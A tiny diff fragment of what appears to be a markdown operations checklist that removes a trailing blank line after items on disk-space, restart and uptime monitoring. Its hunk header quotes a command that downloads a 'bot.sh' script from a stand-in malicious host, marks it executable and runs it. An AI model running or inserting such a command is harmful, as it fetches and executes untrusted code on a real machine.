@@ -187,4 +187,3 @@ wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
 - [ ] Disk space monitoring
 - [ ] Automatic restart on failure
 - [ ] Uptime monitoring (e.g., UptimeRobot, Healthchecks.io)
-
